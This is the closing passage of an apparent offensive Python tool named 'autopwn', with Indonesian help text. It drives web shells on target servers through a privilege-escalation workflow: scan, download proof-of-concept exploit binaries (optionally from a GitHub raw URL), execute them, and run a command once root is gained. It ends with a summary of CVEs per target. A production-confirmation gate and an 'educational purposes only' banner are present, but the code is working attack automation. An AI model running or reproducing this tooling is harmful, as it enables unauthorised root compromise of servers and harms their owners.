                    help="timeout HTTP per request detik (default 20)")
    ap.add_argument("--scan-timeout", type=int, default=600,
                    help="timeout scan di target (default 600)")
    ap.add_argument("--poll", type=int, default=10,
                    help="interval poll background (default 10s)")
    ap.add_argument("--outdir", default=OUT_ROOT,
                    help="direktori output hasil (default lpescan/autopwn-out)")
    ap.add_argument("--production", action="store_true",
                    help="tandai target produksi (wajib --confirm-production)")
    ap.add_argument("--confirm-production", action="store_true",
                    help="konfirmasi eksploitasi target produksi")
    ap.add_argument("--selftest", action="store_true",
                    help="jalankan gate offline, tanpa jaringan")
    ap.set_defaults(serve=True)
    args = ap.parse_args(argv)

    if args.selftest:
        return selftest()
    if not args.shell:
        ap.error("minimal satu --shell URL (atau --selftest)")
    if not gate_production(args):
        return 3
    # post-root-cmd masuk ke dalam double quote pada route su_patched
    args.post_root_cmd = args.post_root_cmd.replace('"', '')
    if args.github:
        if args.fetch_base:
            ap.error("--github dan --fetch-base tidak bisa digabung")
        args.fetch_base = (f"https://raw.githubusercontent.com/"
                           f"{args.github_user}/{args.github_repo}/{args.github_branch}")

    print("=" * 66)
    print("autopwn — otomasi LPE lab (scan -> biner PoC -> eksekusi)")
    print("EDUCATIONAL PURPOSES ONLY — target terautorisasi saja.")
    print(f"versi {VERSION} | target: {len(args.shell)} shell | "
          f"max-exploits {args.max_exploits} | allow-backported: "
          f"{'YA' if args.allow_backported else 'TIDAK'}")
    print("=" * 66)

    os.makedirs(args.outdir, exist_ok=True)
    summary = []
    rc = 0
    for url in args.shell:
        log = LogSink(os.path.join(args.outdir, "autopwn.log"))
        try:
            verdict, outdir = run_target(url, args, log)
            summary.append((url, verdict, outdir))
        except ShellError as e:
            log(f"  [GAGAL] {e}")
            summary.append((url, {"verdict": "error", "detail": str(e)}, None))
            rc = 1
        finally:
            log.close()
    print("\n" + "=" * 66)
    print("RINGKASAN")
    for url, v, od in summary:
        print(f"  {url} -> {v.get('verdict')} "
              f"{('(' + v.get('cve', '') + ')') if v.get('cve') else ''} "
              f"[{os.path.basename(od) if od else '-'}]")
    print("=" * 66)
    return rc


if __name__ == "__main__":
    sys.exit(main())
